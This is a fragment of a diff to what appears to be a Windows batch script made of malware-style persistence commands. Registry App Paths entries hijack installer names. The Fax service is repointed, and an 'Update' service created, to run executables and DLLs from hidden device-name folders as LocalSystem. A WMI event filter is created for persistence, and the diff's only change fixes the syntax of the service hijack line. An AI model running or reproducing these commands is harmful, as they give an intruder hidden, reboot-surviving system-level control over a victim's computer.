@@ -26,7 +26,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
-sc config Fax binPath= "%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
+sc config Fax binPath="%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
 sc create Update binPath="%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" start="auto" obj="LocalSystem"
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
